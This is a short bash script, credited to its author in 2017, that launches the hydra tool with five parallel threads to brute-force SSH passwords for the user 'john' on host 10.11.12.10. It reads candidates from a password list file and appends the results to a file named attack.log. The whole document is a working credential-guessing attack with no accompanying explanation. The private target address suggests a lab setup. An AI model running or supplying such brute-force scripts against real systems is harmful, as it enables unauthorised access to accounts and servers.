#/bin/bash

##############################################################
# SSH Bruteforce with hydra on user "john"
# Ing. Alexander Poschenreithner, 2017
##############################################################

# SSH Login
echo "     => Starting Hydra with 5 heads on SSH"
sudo hydra -t 5 -l john -P /tmp/passwordlist_2.txt -vV 10.11.12.10 ssh >> /tmp/attack.log
